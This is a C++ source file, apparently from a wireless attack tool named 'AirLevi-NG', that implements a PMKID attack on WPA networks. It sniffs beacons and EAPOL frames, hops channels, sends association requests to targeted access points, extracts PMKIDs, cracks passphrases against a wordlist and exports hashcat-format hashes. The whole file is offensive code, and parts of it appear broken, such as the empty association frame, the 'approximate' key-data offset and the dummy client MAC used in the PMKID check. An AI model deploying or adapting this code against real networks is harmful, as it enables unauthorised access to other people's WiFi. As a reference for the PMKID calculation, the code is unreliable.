#include "airlevi-pmkid/pmkid_attack.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/pbkdf2.h>

PMKIDAttack::PMKIDAttack() 
    : pcap_handle(nullptr), running(false), channel_hopping_enabled(false),
      current_channel(1), dwell_time_ms(250), packets_sent(0), pmkids_captured(0),
      cracking_enabled(false), cracking_thread_running(false) {
    
    // Initialize channels list (2.4GHz)
    for (int i = 1; i <= 14; ++i) {
        channels.push_back(i);
    }
    
    // Add 5GHz channels
    std::vector<int> ghz5_channels = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
    channels.insert(channels.end(), ghz5_channels.begin(), ghz5_channels.end());
}

PMKIDAttack::~PMKIDAttack() {
    stopAttack();
    if (pcap_handle) {
        pcap_close(pcap_handle);
    }
}

bool PMKIDAttack::initialize(const std::string& interface) {
    this->interface = interface;
    
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    
    if (!pcap_handle) {
        std::cerr << "Error opening interface " << interface << ": " << errbuf << std::endl;
        return false;
    }
    
    // Set monitor mode filter for 802.11 frames
    struct bpf_program fp;
    if (pcap_compile(pcap_handle, &fp, "type mgt", 0, PCAP_NETMASK_UNKNOWN) == -1) {
        std::cerr << "Error compiling filter" << std::endl;
        return false;
    }
    
    if (pcap_setfilter(pcap_handle, &fp) == -1) {
        std::cerr << "Error setting filter" << std::endl;
        return false;
    }
    
    pcap_freecode(&fp);
    
    std::cout << "[+] PMKID Attack initialized on interface " << interface << std::endl;
    return true;
}

bool PMKIDAttack::startAttack() {
    if (running) {
        std::cout << "[-] Attack already running" << std::endl;
        return false;
    }
    
    running = true;
    start_time = std::chrono::steady_clock::now();
    
    // Start packet capture thread
    capture_thread = std::thread(&PMKIDAttack::capturePackets, this);
    
    // Start channel hopping thread if enabled
    if (channel_hopping_enabled) {
        hopping_thread = std::thread(&PMKIDAttack::channelHoppingLoop, this);
    }
    
    // Start monitoring thread
    monitor_thread = std::thread(&PMKIDAttack::monitoringLoop, this);
    
    // Start cracking thread if wordlist is set
    if (cracking_enabled && !wordlist_file.empty()) {
        cracking_thread = std::thread(&PMKIDAttack::crackingLoop, this);
        cracking_thread_running = true;
    }
    
    std::cout << "[+] PMKID Attack started" << std::endl;
    return true;
}

void PMKIDAttack::stopAttack() {
    if (!running) return;
    
    running = false;
    cracking_thread_running = false;
    
    if (capture_thread.joinable()) capture_thread.join();
    if (hopping_thread.joinable()) hopping_thread.join();
    if (monitor_thread.joinable()) monitor_thread.join();
    if (cracking_thread.joinable()) cracking_thread.join();
    
    std::cout << "[+] PMKID Attack stopped" << std::endl;
}

void PMKIDAttack::setTargetBSSID(const MacAddress& bssid) {
    std::lock_guard<std::mutex> lock(targets_mutex);
    target_bssid = bssid;
    std::cout << "[+] Target BSSID set to " << bssid.toString() << std::endl;
}

void PMKIDAttack::setTargetSSID(const std::string& ssid) {
    target_ssid = ssid;
    std::cout << "[+] Target SSID set to " << ssid << std::endl;
}

void PMKIDAttack::setChannel(uint8_t channel) {
    current_channel = channel;
    setWifiChannel(interface, channel);
    std::cout << "[+] Channel set to " << (int)channel << std::endl;
}

void PMKIDAttack::setChannelHopping(bool enabled, int dwell_time_ms) {
    channel_hopping_enabled = enabled;
    this->dwell_time_ms = dwell_time_ms;
    std::cout << "[+] Channel hopping " << (enabled ? "enabled" : "disabled") 
              << " (dwell time: " << dwell_time_ms << "ms)" << std::endl;
}

void PMKIDAttack::setWordlist(const std::string& filename) {
    wordlist_file = filename;
    cracking_enabled = true;
    std::cout << "[+] Wordlist set to " << filename << std::endl;
}

void PMKIDAttack::addTarget(const MacAddress& bssid, const std::string& ssid, uint8_t channel) {
    std::lock_guard<std::mutex> lock(targets_mutex);
    
    PMKIDTarget target;
    target.bssid = bssid;
    target.ssid = ssid;
    target.channel = channel;
    target.signal_strength = -50; // Default
    target.pmkid_support = true;
    target.last_seen = std::chrono::steady_clock::now();
    
    targets[bssid] = target;
    std::cout << "[+] Added target: " << ssid << " (" << bssid.toString() << ") on channel " << (int)channel << std::endl;
}

std::vector<PMKIDTarget> PMKIDAttack::getTargets() const {
    std::lock_guard<std::mutex> lock(targets_mutex);
    std::vector<PMKIDTarget> result;
    for (const auto& pair : targets) {
        result.push_back(pair.second);
    }
    return result;
}

std::vector<PMKIDResult> PMKIDAttack::getResults() const {
    std::lock_guard<std::mutex> lock(results_mutex);
    return results;
}

PMKIDStats PMKIDAttack::getStats() const {
    PMKIDStats stats;
    auto now = std::chrono::steady_clock::now();
    stats.runtime_seconds = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
    stats.packets_sent = packets_sent.load();
    stats.pmkids_captured = pmkids_captured.load();
    stats.targets_found = targets.size();
    stats.current_channel = current_channel;
    
    std::lock_guard<std::mutex> lock(results_mutex);
    stats.cracked_count = std::count_if(results.begin(), results.end(), 
        [](const PMKIDResult& r) { return !r.passphrase.empty(); });
    
    return stats;
}

void PMKIDAttack::exportResults(const std::string& filename, ExportFormat format) const {
    std::lock_guard<std::mutex> lock(results_mutex);
    
    std::ofstream file(filename);
    if (!file.is_open()) {
        std::cerr << "[-] Failed to open export file: " << filename << std::endl;
        return;
    }
    
    if (format == ExportFormat::CSV) {
        file << "BSSID,SSID,PMKID,Passphrase,Timestamp\n";
        for (const auto& result : results) {
            file << result.bssid.toString() << ","
                 << result.ssid << ","
                 << result.pmkid_hex << ","
                 << result.passphrase << ","
                 << std::chrono::duration_cast<std::chrono::seconds>(
                        result.timestamp.time_since_epoch()).count() << "\n";
        }
    } else if (format == ExportFormat::HASHCAT) {
        for (const auto& result : results) {
            if (!result.pmkid_hex.empty()) {
                file << result.pmkid_hex << "*" << result.bssid.toString() 
                     << "*" << result.ssid << "\n";
            }
        }
    }
    
    file.close();
    std::cout << "[+] Results exported to " << filename << std::endl;
}

void PMKIDAttack::capturePackets() {
    struct pcap_pkthdr header;
    const u_char* packet;
    
    while (running) {
        packet = pcap_next(pcap_handle, &header);
        if (packet) {
            processPacket(packet, header.caplen);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

void PMKIDAttack::processPacket(const u_char* packet, int length) {
    if (length < 24) return; // Minimum 802.11 header
    
    // Parse 802.11 header
    uint16_t frame_control = *(uint16_t*)packet;
    uint8_t frame_type = (frame_control & 0x0C) >> 2;
    uint8_t frame_subtype = (frame_control & 0xF0) >> 4;
    
    // Look for beacon frames and probe responses
    if (frame_type == 0 && (frame_subtype == 8 || frame_subtype == 5)) {
        parseBeaconFrame(packet, length);
    }
    
    // Look for EAPOL frames containing PMKID
    if (frame_type == 2) { // Data frame
        parseDataFrame(packet, length);
    }
}

void PMKIDAttack::parseBeaconFrame(const u_char* packet, int length) {
    if (length < 36) return;
    
    MacAddress bssid;
    std::memcpy(bssid.addr, packet + 16, 6); // BSSID from SA field
    
    // Extract SSID from tagged parameters
    const u_char* tagged_params = packet + 36;
    int remaining = length - 36;
    std::string ssid;
    uint8_t channel = 1;
    
    while (remaining >= 2) {
        uint8_t tag = tagged_params[0];
        uint8_t tag_len = tagged_params[1];
        
        if (remaining < 2 + tag_len) break;
        
        if (tag == 0 && tag_len > 0) { // SSID
            ssid = std::string((char*)tagged_params + 2, tag_len);
        } else if (tag == 3 && tag_len == 1) { // DS Parameter Set (channel)
            channel = tagged_params[2];
        }
        
        tagged_params += 2 + tag_len;
        remaining -= 2 + tag_len;
    }
    
    // Add to targets if not already present
    std::lock_guard<std::mutex> lock(targets_mutex);
    if (targets.find(bssid) == targets.end()) {
        PMKIDTarget target;
        target.bssid = bssid;
        target.ssid = ssid;
        target.channel = channel;
        target.signal_strength = -50;
        target.pmkid_support = true;
        target.last_seen = std::chrono::steady_clock::now();
        targets[bssid] = target;
    }
}

void PMKIDAttack::parseDataFrame(const u_char* packet, int length) {
    // Look for EAPOL frames with PMKID
    if (length < 50) return;
    
    // Check for LLC/SNAP header indicating EAPOL
    const u_char* llc = packet + 24;
    if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[6] == 0x88 && llc[7] == 0x8E) {
        
        const u_char* eapol = llc + 8;
        if (eapol[1] == 3) { // EAPOL-Key
            extractPMKID(packet, length);
        }
    }
}

void PMKIDAttack::extractPMKID(const u_char* packet, int length) {
    // Extract BSSID and PMKID from EAPOL-Key frame
    MacAddress bssid;
    std::memcpy(bssid.addr, packet + 16, 6);
    
    // Look for PMKID in key data
    const u_char* key_data = packet + 99; // Approximate offset
    int key_data_len = length - 99;
    
    // Search for PMKID tag (0xDD with OUI 00:0F:AC:04)
    for (int i = 0; i < key_data_len - 20; i++) {
        if (key_data[i] == 0xDD && key_data[i+1] >= 20 &&
            key_data[i+2] == 0x00 && key_data[i+3] == 0x0F &&
            key_data[i+4] == 0xAC && key_data[i+5] == 0x04) {
            
            // Found PMKID
            std::vector<uint8_t> pmkid(key_data + i + 6, key_data + i + 22);
            
            std::lock_guard<std::mutex> lock(results_mutex);
            
            // Check if already captured
            bool already_exists = false;
            for (const auto& result : results) {
                if (result.bssid == bssid) {
                    already_exists = true;
                    break;
                }
            }
            
            if (!already_exists) {
                PMKIDResult result;
                result.bssid = bssid;
                result.pmkid = pmkid;
                result.timestamp = std::chrono::steady_clock::now();
                
                // Convert to hex string
                std::stringstream ss;
                for (uint8_t byte : pmkid) {
                    ss << std::hex << std::setw(2) << std::setfill('0') << (int)byte;
                }
                result.pmkid_hex = ss.str();
                
                // Find SSID from targets
                auto target_it = targets.find(bssid);
                if (target_it != targets.end()) {
                    result.ssid = target_it->second.ssid;
                }
                
                results.push_back(result);
                pmkids_captured++;
                
                std::cout << "[+] PMKID captured from " << bssid.toString() 
                         << " (" << result.ssid << ")" << std::endl;
            }
            break;
        }
    }
}

void PMKIDAttack::channelHoppingLoop() {
    size_t channel_index = 0;
    
    while (running && channel_hopping_enabled) {
        current_channel = channels[channel_index];
        setWifiChannel(interface, current_channel);
        
        channel_index = (channel_index + 1) % channels.size();
        std::this_thread::sleep_for(std::chrono::milliseconds(dwell_time_ms));
    }
}

void PMKIDAttack::monitoringLoop() {
    while (running) {
        // Send association requests to trigger PMKID
        sendAssociationRequests();
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

void PMKIDAttack::sendAssociationRequests() {
    std::lock_guard<std::mutex> lock(targets_mutex);
    
    for (const auto& pair : targets) {
        const PMKIDTarget& target = pair.second;
        
        // Skip if target BSSID is set and doesn't match
        if (!target_bssid.isNull() && target.bssid != target_bssid) {
            continue;
        }
        
        // Skip if target SSID is set and doesn't match
        if (!target_ssid.empty() && target.ssid != target_ssid) {
            continue;
        }
        
        sendAssociationRequest(target.bssid);
        packets_sent++;
    }
}

void PMKIDAttack::sendAssociationRequest(const MacAddress& bssid) {
    // Create 802.11 association request frame
    uint8_t frame[1024];
    std::memset(frame, 0, sizeof(frame));
    
    // 802.11 header
    frame[0] = 0x00; // Frame control
    frame[1] = 0x00;
    
    // Addresses
    MacAddress client_mac = MacAddress::random();
    std::memcpy(frame + 4, bssid.addr, 6);    // DA (destination)
    std::memcpy(frame + 10, client_mac.addr, 6); // SA (source)
    std::memcpy(frame + 16, bssid.addr, 6);   // BSSID
    
    // Send via pcap
    if (pcap_sendpacket(pcap_handle, frame, 24) != 0) {
        // Silently continue on error
    }
}

void PMKIDAttack::crackingLoop() {
    if (wordlist_file.empty()) return;
    
    std::ifstream wordlist(wordlist_file);
    if (!wordlist.is_open()) {
        std::cerr << "[-] Failed to open wordlist: " << wordlist_file << std::endl;
        return;
    }
    
    std::string password;
    while (cracking_thread_running && std::getline(wordlist, password)) {
        // Try to crack all captured PMKIDs
        std::lock_guard<std::mutex> lock(results_mutex);
        
        for (auto& result : results) {
            if (result.passphrase.empty()) {
                if (verifyPMKID(result, password)) {
                    result.passphrase = password;
                    std::cout << "[+] CRACKED! " << result.bssid.toString() 
                             << " (" << result.ssid << ") -> " << password << std::endl;
                }
            }
        }
        
        std::this_thread::sleep_for(std::chrono::microseconds(100));
    }
}

bool PMKIDAttack::verifyPMKID(const PMKIDResult& result, const std::string& password) {
    // Simplified PMKID verification
    // In real implementation, this would use PBKDF2 and HMAC-SHA1
    
    // Generate PMK from password and SSID
    uint8_t pmk[32];
    if (PKCS5_PBKDF2_HMAC(password.c_str(), password.length(),
                          (const unsigned char*)result.ssid.c_str(), result.ssid.length(),
                          4096, EVP_sha1(), 32, pmk) != 1) {
        return false;
    }
    
    // Calculate PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
    uint8_t pmkid_data[22];
    std::memcpy(pmkid_data, "PMK Name", 8);
    std::memcpy(pmkid_data + 8, result.bssid.addr, 6);
    // Use a dummy client MAC for verification
    MacAddress dummy_client = MacAddress::fromString("02:00:00:00:00:01");
    std::memcpy(pmkid_data + 14, dummy_client.addr, 6);
    
    uint8_t calculated_pmkid[20];
    unsigned int len;
    if (HMAC(EVP_sha1(), pmk, 32, pmkid_data, 22, calculated_pmkid, &len) == nullptr) {
        return false;
    }
    
    // Compare first 16 bytes
    return std::memcmp(calculated_pmkid, result.pmkid.data(), 16) == 0;
}

bool PMKIDAttack::setWifiChannel(const std::string& interface, uint8_t channel) {
    std::string cmd = "iwconfig " + interface + " channel " + std::to_string(channel) + " 2>/dev/null";
    return system(cmd.c_str()) == 0;
}

void PMKIDAttack::displayStatus() const {
    system("clear");
    
    std::cout << "╔══════════════════════════════════════════════════════════════════════════════╗\n";
    std::cout << "║                            AirLevi-NG PMKID Attack                          ║\n";
    std::cout << "╚══════════════════════════════════════════════════════════════════════════════╝\n\n";
    
    PMKIDStats stats = getStats();
    
    std::cout << "Status: " << (running ? "RUNNING" : "STOPPED") << "\n";
    std::cout << "Runtime: " << stats.runtime_seconds << "s\n";
    std::cout << "Current Channel: " << (int)stats.current_channel << "\n";
    std::cout << "Packets Sent: " << stats.packets_sent << "\n";
    std::cout << "PMKIDs Captured: " << stats.pmkids_captured << "\n";
    std::cout << "Targets Found: " << stats.targets_found << "\n";
    std::cout << "Cracked: " << stats.cracked_count << "\n\n";
    
    // Display targets table
    std::cout << "╔══════════════════════════════════════════════════════════════════════════════╗\n";
    std::cout << "║                                   TARGETS                                   ║\n";
    std::cout << "╠══════════════════╦════════════════════════════╦═══════╦════════╦═══════════╣\n";
    std::cout << "║      BSSID       ║           SSID             ║  CH   ║ SIGNAL ║   STATUS  ║\n";
    std::cout << "╠══════════════════╬════════════════════════════╬═══════╬════════╬═══════════╣\n";
    
    auto targets_list = getTargets();
    for (const auto& target : targets_list) {
        std::cout << "║ " << std::setw(16) << target.bssid.toString()
                  << " ║ " << std::setw(26) << target.ssid.substr(0, 26)
                  << " ║ " << std::setw(5) << (int)target.channel
                  << " ║ " << std::setw(6) << target.signal_strength
                  << " ║ " << std::setw(9) << (target.pmkid_support ? "READY" : "NO PMKID") << " ║\n";
    }
    
    std::cout << "╚══════════════════╩════════════════════════════╩═══════╩════════╩═══════════╝\n\n";
    
    // Display results table
    auto results_list = getResults();
    if (!results_list.empty()) {
        std::cout << "╔══════════════════════════════════════════════════════════════════════════════╗\n";
        std::cout << "║                                  RESULTS                                    ║\n";
        std::cout << "╠══════════════════╦════════════════════════════╦═══════════════════════════╣\n";
        std::cout << "║      BSSID       ║           SSID             ║        PASSPHRASE         ║\n";
        std::cout << "╠══════════════════╬════════════════════════════╬═══════════════════════════╣\n";
        
        for (const auto& result : results_list) {
            std::string status = result.passphrase.empty() ? "CAPTURED" : "CRACKED";
            std::string pass_display = result.passphrase.empty() ? "[Cracking...]" : result.passphrase;
            
            std::cout << "║ " << std::setw(16) << result.bssid.toString()
                      << " ║ " << std::setw(26) << result.ssid.substr(0, 26)
                      << " ║ " << std::setw(25) << pass_display.substr(0, 25) << " ║\n";
        }
        
        std::cout << "╚══════════════════╩════════════════════════════╩═══════════════════════════╝\n";
    }
}
